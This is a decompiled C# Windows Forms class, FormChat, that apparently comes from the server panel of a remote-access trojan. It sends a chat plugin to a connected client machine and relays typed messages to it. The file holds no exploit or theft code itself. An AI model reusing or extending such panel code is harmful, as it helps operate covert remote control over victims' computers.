using System;
using System.ComponentModel;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Server.Algorithm;
using Server.Connection;
using Server.MessagePack;

namespace Server.Forms
{
	// Token: 0x02000064 RID: 100
	public partial class FormChat : Form
	{
		// Token: 0x17000065 RID: 101
		// (get) Token: 0x0600020C RID: 524 RVA: 0x000178F6 File Offset: 0x00015AF6
		// (set) Token: 0x0600020D RID: 525 RVA: 0x000178FE File Offset: 0x00015AFE
		public Form1 F { get; set; }

		// Token: 0x17000066 RID: 102
		// (get) Token: 0x0600020E RID: 526 RVA: 0x00017907 File Offset: 0x00015B07
		// (set) Token: 0x0600020F RID: 527 RVA: 0x0001790F File Offset: 0x00015B0F
		internal Clients ParentClient { get; set; }

		// Token: 0x17000067 RID: 103
		// (get) Token: 0x06000210 RID: 528 RVA: 0x00017918 File Offset: 0x00015B18
		// (set) Token: 0x06000211 RID: 529 RVA: 0x00017920 File Offset: 0x00015B20
		internal Clients Client { get; set; }

		// Token: 0x06000212 RID: 530 RVA: 0x00017929 File Offset: 0x00015B29
		public FormChat()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000213 RID: 531 RVA: 0x00017944 File Offset: 0x00015B44
		private void TextBox1_KeyDown(object sender, KeyEventArgs e)
		{
			if (this.textBox1.Enabled && e.KeyData == Keys.Return && !string.IsNullOrWhiteSpace(this.textBox1.Text))
			{
				this.richTextBox1.AppendText("ME: " + this.textBox1.Text + Environment.NewLine);
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "chatWriteInput";
				msgPack.ForcePathObject("Input").AsString = this.Nickname + ": " + this.textBox1.Text;
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				this.textBox1.Clear();
			}
		}

		// Token: 0x06000214 RID: 532 RVA: 0x00017A18 File Offset: 0x00015C18
		private void FormChat_Load(object sender, EventArgs e)
		{
			string text = Interaction.InputBox("TYPE YOUR NICKNAME", "CHAT", "Admin", -1, -1);
			if (string.IsNullOrEmpty(text))
			{
				base.Close();
				return;
			}
			this.Nickname = text;
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "plugin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Chat.dll");
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.ParentClient.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x06000215 RID: 533 RVA: 0x00017AA4 File Offset: 0x00015CA4
		private void FormChat_FormClosed(object sender, FormClosedEventArgs e)
		{
			if (this.Client != null)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "chatExit";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000216 RID: 534 RVA: 0x00017B08 File Offset: 0x00015D08
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.ParentClient.TcpClient.Connected || !this.Client.TcpClient.Connected)
				{
					base.Close();
				}
			}
			catch
			{
			}
		}

		// Token: 0x040001C3 RID: 451
		private string Nickname = "Admin";
	}
}
